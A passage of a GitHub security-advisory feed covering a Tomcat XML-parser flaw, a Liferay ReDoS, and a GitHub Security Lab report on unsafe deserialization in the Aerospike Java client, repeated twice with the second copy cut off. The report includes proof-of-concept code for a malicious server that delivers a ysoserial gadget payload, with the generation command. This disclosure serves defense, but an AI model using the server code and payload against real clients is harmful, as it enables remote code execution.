        <content type="html"><![CDATA[<p>Apache Tomcat 7.0.x before 7.0.17 permits web applications to replace an XML parser used for other web applications, which allows local users to read or modify the (1) web.xml, (2) context.xml, or (3) tld files of arbitrary web applications via a crafted application that is loaded earlier than the target application.  NOTE: this vulnerability exists because of a CVE-2009-0783 regression.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2481">https://nvd.nist.gov/vuln/detail/CVE-2011-2481</a></li>
<li><a href="https://issues.apache.org/bugzilla/show_bug.cgi?id=51395">https://issues.apache.org/bugzilla/show_bug.cgi?id=51395</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=139344343412337&amp;w=2">http://marc.info/?l=bugtraq&amp;m=139344343412337&amp;w=2</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1137753">http://svn.apache.org/viewvc?view=revision&amp;revision=1137753</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1138788">http://svn.apache.org/viewvc?view=revision&amp;revision=1138788</a></li>
<li><a href="http://tomcat.apache.org/security-7.html">http://tomcat.apache.org/security-7.html</a></li>
<li><a href="https://web.archive.org/web/20111209022500/http://www.securityfocus.com/bid/49147">https://web.archive.org/web/20111209022500/http://www.securityfocus.com/bid/49147</a></li>
<li><a href="https://web.archive.org/web/20161127215021/http://securitytracker.com/id?1025924">https://web.archive.org/web/20161127215021/http://securitytracker.com/id?1025924</a></li>
<li><a href="https://github.com/advisories/GHSA-r7c8-hghc-2mp8">https://github.com/advisories/GHSA-r7c8-hghc-2mp8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r7c8-hghc-2mp8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T02:44:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.liferay.portal:release.portal.bom] Inefficient Regular Expression Complexity in Liferay Portal ]]></title>
        <id>https://github.com/advisories/GHSA-vjj4-qwcm-552h</id>
        <link href="https://github.com/advisories/GHSA-vjj4-qwcm-552h"/>
        <updated>2023-08-17T05:02:52.000Z</updated>
        <content type="html"><![CDATA[<p>ReDoS vulnerability in LayoutPageTemplateEntryUpgradeProcess in Liferay Portal 7.3.2 through 7.4.3.4 and Liferay DXP 7.2 fix pack 9 through fix pack 18, 7.3 before update 4, and DXP 7.4 GA allows remote attackers to consume an excessive amount of server resources via a crafted payload injected into the 'name' field of a layout prototype.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-42124">https://nvd.nist.gov/vuln/detail/CVE-2022-42124</a></li>
<li><a href="https://issues.liferay.com/browse/LPE-17435">https://issues.liferay.com/browse/LPE-17435</a></li>
<li><a href="https://issues.liferay.com/browse/LPE-17535">https://issues.liferay.com/browse/LPE-17535</a></li>
<li><a href="https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/cve-2022-42124">https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/cve-2022-42124</a></li>
<li><a href="https://github.com/advisories/GHSA-vjj4-qwcm-552h">https://github.com/advisories/GHSA-vjj4-qwcm-552h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjj4-qwcm-552h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-11-15T12:00:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.aerospike:aerospike-client] Aerospike Java Client vulnerable to unsafe deserialization of server responses]]></title>
        <id>https://github.com/advisories/GHSA-jj95-55cr-9597</id>
        <link href="https://github.com/advisories/GHSA-jj95-55cr-9597"/>
        <updated>2023-08-17T05:02:46.000Z</updated>
        <content type="html"><![CDATA[<h1 id="github-security-lab-ghsl-vulnerability-report-ghsl-2023-044">GitHub Security Lab (GHSL) Vulnerability Report: <code>GHSL-2023-044</code></h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified a potential security vulnerability in <a href="https://github.com/aerospike/aerospike-client-java/">Aerospike Java Client</a>.</p>
<p>We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2023-044</code> as a reference).</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.</p>
<h2 id="product">Product</h2>
<p>Aerospike Java Client</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7">6.1.7</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-unsafe-deserialization-of-server-responses-ghsl-2023-044">Issue: Unsafe deserialization of server responses (<code>GHSL-2023-044</code>)</h3>
<p>The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the <code>NettyCommand</code> class. This class includes an <code>InboundHandler</code> that extends Netty's <code>ChannelInboundHandlerAdapter</code>, which handles inbound data coming from the Netty channel established with the server. This is implemented in the <code>channelRead</code> method:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157"><code>client/src/com/aerospike/client/async/NettyCommand.java:1157</code></a></p>
<pre><code class="language-java">@Override
public void channelRead(ChannelHandlerContext ctx, Object msg) {
    command.read((ByteBuf)msg);
}
</code></pre>
<p>The incoming <code>msg</code> object is handled by the <code>NettyCommand.read</code> method, which behaves differently depending on the <code>state</code> variable. Several states produce paths to the vulnerable code â€” for instance, we will follow the path through <code>AsyncCommand.COMMAND_READ_HEADER</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489"><code>/client/src/com/aerospike/client/async/NettyCommand.java:489</code></a></p>
<pre><code class="language-java">private void read(ByteBuf byteBuffer) {
    eventReceived = true;

    try {
        switch (state) {
            // --snip--
            case AsyncCommand.COMMAND_READ_HEADER:
                if (command.isSingle) {
                    readSingleHeader(byteBuffer);
                }
                // --snip--
        }
        // --snip--
    }
    // --snip---
}
</code></pre>
<p>Some bytes are read from the message buffer and saved in <code>command.dataBuffer</code> in the <code>readSingleHeader</code> method, after which <code>parseSingleBody</code> is called:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596"><code>client/src/com/aerospike/client/async/NettyCommand.java:596</code></a></p>
<pre><code class="language-java">private void readSingleHeader(ByteBuf byteBuffer) {
    int readableBytes = byteBuffer.readableBytes();
    int dataSize = command.dataOffset + readableBytes;

    // --snip--

    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);
    command.dataOffset = dataSize;

    if (command.dataOffset &gt;= receiveSize) {
        parseSingleBody();
    }
}
</code></pre>
<p><code>parseSingleBody</code> simply delegates on <code>AsyncCommand.parseCommandResult</code>, which unless the message is compressed, directly calls <code>AsyncCommand.parseResult</code>. The implementation of this method depends on the command type. For an <code>AsyncRead</code> command, we have the following:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68"><code>client/src/com/aerospike/client/async/AsyncRead.java:68</code></a></p>
<pre><code class="language-java">@Override
protected final boolean parseResult() {
    validateHeaderSize();

    int resultCode = dataBuffer[dataOffset + 5] &amp; 0xFF;
    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);
    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);
    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);
    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);
    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;

    if (resultCode == 0) {
        // --snip--
        skipKey(fieldCount);
        record = parseRecord(opCount, generation, expiration, isOperation);
        return true;
    }
</code></pre>
<p>It can be seen that several fields are read from the message's bytes, and then a call to <code>Command.parseRecord</code> happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083"><code>client/src/com/aerospike/client/command/Command.java:2083</code></a></p>
<pre><code class="language-java">protected final Record parseRecord(
    int opCount,
    int generation,
    int expiration,
    boolean isOperation
)  {
    Map&lt;String,Object&gt; bins = new LinkedHashMap&lt;&gt;();

    for (int i = 0 ; i &lt; opCount; i++) {
        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);
        byte particleType = dataBuffer[dataOffset + 5];
        byte nameSize = dataBuffer[dataOffset + 7];
        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);
        dataOffset += 4 + 4 + nameSize;

        int particleBytesSize = opSize - (4 + nameSize);
        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);
</code></pre>
<p><code>Buffer.bytesToParticle</code> converts the remaining bytes in the data buffer depending on the <code>particleType</code> field. We're interested in the <code>JBLOB</code> case:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53"><code>client/src/com/aerospike/client/command/Buffer.java:53</code></a></p>
<pre><code class="language-java">public static Object bytesToParticle(int type, byte[] buf, int offset, int len)
    throws AerospikeException {
        switch (type) {
            // --snip--
            case ParticleType.JBLOB:
                return Buffer.bytesToObject(buf, offset, len);
</code></pre>
<p>In <code>bytesToObject</code>, the deserialization of an object from the message bytes happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300"><code>client/src/com/aerospike/client/command/Buffer.java:300</code></a></p>
<pre><code class="language-java">public static Object bytesToObject(byte[] buf, int offset, int length) {
    // --snip--
    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {
        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
            return oistream.readObject();
        }
    }
    // --snip--
}
</code></pre>
<p>NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in <code>Unpacker.unpackBlock</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227"><code>client/src/com/aerospike/client/util/Unpacker.java:227</code></a></p>
<pre><code class="language-java">private T unpackBlob(int count) throws IOException, ClassNotFoundException {
    // --snip--
    case ParticleType.JBLOB:
        // --snip--
        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {
            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
                val = getJavaBlob(oistream.readObject());
            }
        }
</code></pre>
<p>This vulnerability was discovered with the help of <a href="https://codeql.github.com/">CodeQL</a>.</p>
<h4 id="impact">Impact</h4>
<p>This issue may lead to Remote Code Execution (RCE) in the Java client.</p>
<h4 id="remediation">Remediation</h4>
<p>Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.</p>
<p>Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.</p>
<h4 id="resources">Resources</h4>
<p>To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the <code>-netty</code> flag, specifically the <code>AsyncPutGet</code>, which uses an <code>AsyncRead</code>. The examples point to <code>localhost:3000</code> by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the <code>AsyncRead</code> command happens. Then, our server injects the malicious response:</p>
<pre><code class="language-java">public class AttackChannelHandler extends SimpleChannelInboundHandler&lt;String&gt; {

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {
        // --snip--
        if (s.getBytes()[7] == 0x44) {
            AttackMessage m = new AttackMessage(
                    Files.readAllBytes(Paths.get("location/of/deserialization/payload.bin")));
            ctx.channel().writeAndFlush(m);
            return;
        }
        // --snip--
    }
}
</code></pre>
<p><code>AttackMessage</code> is a class that hardcodes the necessary data to deliver the payload:</p>
<pre><code class="language-java">public class AttackMessage {

    private byte resultCode = 0;
    private int generation = 2;
    private int expiration = 417523457;
    private short fieldCount = 0;
    private short opCount = 1;
    private byte particleType = 7;
    private String name = "putgetbin";
    private byte[] payload;

    public AttackMessage(byte[] payload) {
        this.payload = payload;
    }

    // --snip-- (getters)

    public int[] getSize() {
        int size = 30 + name.length() + payload.length;
        int low = (byte) (size &amp; 0xFF);
        int high = (byte) (size &gt;&gt; 8) &amp; 0xFF;
        return new int[] {high, low};
    }

    public int getOpSize() {
        return payload.length + 4 + name.length();
    }

    public byte[] getPayload() {
        return payload;
    }
}
</code></pre>
<p>And it's finally encoded and delivered to the client through the network using a <code>MessageToByteEncoder</code> from Netty:</p>
<pre><code class="language-java">public class AttackMessageEncoder extends MessageToByteEncoder&lt;AttackMessage&gt; {

    @Override
    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)
            throws Exception {
        // header
        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});
        int[] length = msg.getSize();
        out.writeByte(length[0]);
        out.writeByte(length[1]);

        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});
        out.writeByte(msg.getResultCode());
        out.writeInt(msg.getGeneration());
        out.writeInt(msg.getExpiration());

        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});
        out.writeShort(msg.getFieldCount());
        out.writeShort(msg.getOpCount());
        out.writeInt(msg.getOpSize());

        out.writeByte(0x01);
        out.writeByte(msg.getParticleType());

        out.writeByte(0x00);
        out.writeByte(msg.getName().length());
        out.writeCharSequence(msg.getName(), Charset.defaultCharset());
        out.writeBytes(msg.getPayload());
    }

}
</code></pre>
<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>
<pre><code class="language-xml">&lt;dependency&gt;
  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
  &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
  &lt;version&gt;4.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>In which case, the malicious payload file could be generated using <a href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a> as follows:</p>
<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin
</code></pre>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by the GitHub CodeQL team members <a href="https://github.com/atorralba">@atorralba (Tony Torralba)</a> and <a href="https://github.com/joefarebrother">@joefarebrother (Joseph Farebrother)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2023-044</code> in any communication regarding this issue.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597">https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900">https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36480">https://nvd.nist.gov/vuln/detail/CVE-2023-36480</a></li>
<li><a href="https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses">https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a">https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae">https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36">https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36</a></li>
<li><a href="https://github.com/advisories/GHSA-jj95-55cr-9597">https://github.com/advisories/GHSA-jj95-55cr-9597</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj95-55cr-9597</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-08-03T19:45:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.aerospike:aerospike-client] Aerospike Java Client vulnerable to unsafe deserialization of server responses]]></title>
        <id>https://github.com/advisories/GHSA-jj95-55cr-9597</id>
        <link href="https://github.com/advisories/GHSA-jj95-55cr-9597"/>
        <updated>2023-08-17T05:02:46.000Z</updated>
        <content type="html"><![CDATA[<h1 id="github-security-lab-ghsl-vulnerability-report-ghsl-2023-044">GitHub Security Lab (GHSL) Vulnerability Report: <code>GHSL-2023-044</code></h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified a potential security vulnerability in <a href="https://github.com/aerospike/aerospike-client-java/">Aerospike Java Client</a>.</p>
<p>We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2023-044</code> as a reference).</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.</p>
<h2 id="product">Product</h2>
<p>Aerospike Java Client</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7">6.1.7</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-unsafe-deserialization-of-server-responses-ghsl-2023-044">Issue: Unsafe deserialization of server responses (<code>GHSL-2023-044</code>)</h3>
<p>The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the <code>NettyCommand</code> class. This class includes an <code>InboundHandler</code> that extends Netty's <code>ChannelInboundHandlerAdapter</code>, which handles inbound data coming from the Netty channel established with the server. This is implemented in the <code>channelRead</code> method:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157"><code>client/src/com/aerospike/client/async/NettyCommand.java:1157</code></a></p>
<pre><code class="language-java">@Override
public void channelRead(ChannelHandlerContext ctx, Object msg) {
    command.read((ByteBuf)msg);
}
</code></pre>
<p>The incoming <code>msg</code> object is handled by the <code>NettyCommand.read</code> method, which behaves differently depending on the <code>state</code> variable. Several states produce paths to the vulnerable code â€” for instance, we will follow the path through <code>AsyncCommand.COMMAND_READ_HEADER</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489"><code>/client/src/com/aerospike/client/async/NettyCommand.java:489</code></a></p>
<pre><code class="language-java">private void read(ByteBuf byteBuffer) {
    eventReceived = true;

    try {
        switch (state) {
            // --snip--
            case AsyncCommand.COMMAND_READ_HEADER:
                if (command.isSingle) {
                    readSingleHeader(byteBuffer);
                }
                // --snip--
        }
        // --snip--
    }
    // --snip---
}
</code></pre>
<p>Some bytes are read from the message buffer and saved in <code>command.dataBuffer</code> in the <code>readSingleHeader</code> method, after which <code>parseSingleBody</code> is called:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596"><code>client/src/com/aerospike/client/async/NettyCommand.java:596</code></a></p>
<pre><code class="language-java">private void readSingleHeader(ByteBuf byteBuffer) {
    int readableBytes = byteBuffer.readableBytes();
    int dataSize = command.dataOffset + readableBytes;

    // --snip--

    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);
    command.dataOffset = dataSize;

    if (command.dataOffset &gt;= receiveSize) {
        parseSingleBody();
    }
}
</code></pre>
<p><code>parseSingleBody</code> simply delegates on <code>AsyncCommand.parseCommandResult</code>, which unless the message is compressed, directly calls <code>AsyncCommand.parseResult</code>. The implementation of this method depends on the command type. For an <code>AsyncRead</code> command, we have the following:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68"><code>client/src/com/aerospike/client/async/AsyncRead.java:68</code></a></p>
<pre><code class="language-java">@Override
protected final boolean parseResult() {
    validateHeaderSize();

    int resultCode = dataBuffer[dataOffset + 5] &amp; 0xFF;
    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);
    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);
    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);
    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);
    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;

    if (resultCode == 0) {
        // --snip--
        skipKey(fieldCount);
        record = parseRecord(opCount, generation, expiration, isOperation);
        return true;
    }
</code></pre>
<p>It can be seen that several fields are read from the message's bytes, and then a call to <code>Command.parseRecord</code> happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083"><code>client/src/com/aerospike/client/command/Command.java:2083</code></a></p>
<pre><code class="language-java">protected final Record parseRecord(
    int opCount,
    int generation,
    int expiration,
    boolean isOperation
)  {
    Map&lt;String,Object&gt; bins = new LinkedHashMap&lt;&gt;();

    for (int i = 0 ; i &lt; opCount; i++) {
        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);
        byte particleType = dataBuffer[dataOffset + 5];
        byte nameSize = dataBuffer[dataOffset + 7];
        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);
        dataOffset += 4 + 4 + nameSize;

        int particleBytesSize = opSize - (4 + nameSize);
        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);
</code></pre>
<p><code>Buffer.bytesToParticle</code> converts the remaining bytes in the data buffer depending on the <code>particleType</code> field. We're interested in the <code>JBLOB</code> case:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53"><code>client/src/com/aerospike/client/command/Buffer.java:53</code></a></p>
<pre><code class="language-java">public static Object bytesToParticle(int type, byte[] buf, int offset, int len)
    throws AerospikeException {
        switch (type) {
            // --snip--
            case ParticleType.JBLOB:
                return Buffer.bytesToObject(buf, offset, len);
</code></pre>
<p>In <code>bytesToObject</code>, the deserialization of an object from the message bytes happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300"><code>client/src/com/aerospike/client/command/Buffer.java:300</code></a></p>
<pre><code class="language-java">public static Object bytesToObject(byte[] buf, int offset, int length) {
    // --snip--
    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {
        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
            return oistream.readObject();
        }
    }
    // --snip--
}
</code></pre>
<p>NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in <code>Unpacker.unpackBlock</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227"><code>client/src/com/aerospike/client/util/Unpacker.java:227</code></a></p>
<pre><code class="language-java">private T unpackBlob(int count) throws IOException, ClassNotFoundException {
    // --snip--
    case ParticleType.JBLOB:
        // --snip--
        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {
            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
                val = getJavaBlob(oistream.readObject());
            }
        }
</code></pre>
<p>This vulnerability was discovered with the help of <a href="https://codeql.github.com/">CodeQL</a>.</p>
<h4 id="impact">Impact</h4>
<p>This issue may lead to Remote Code Execution (RCE) in the Java client.</p>
<h4 id="remediation">Remediation</h4>
<p>Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.</p>
<p>Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.</p>
<h4 id="resources">Resources</h4>
<p>To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the <code>-netty</code> flag, specifically the <code>AsyncPutGet</code>, which uses an <code>AsyncRead</code>. The examples point to <code>localhost:3000</code> by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the <code>AsyncRead</code> command happens. Then, our server injects the malicious response:</p>
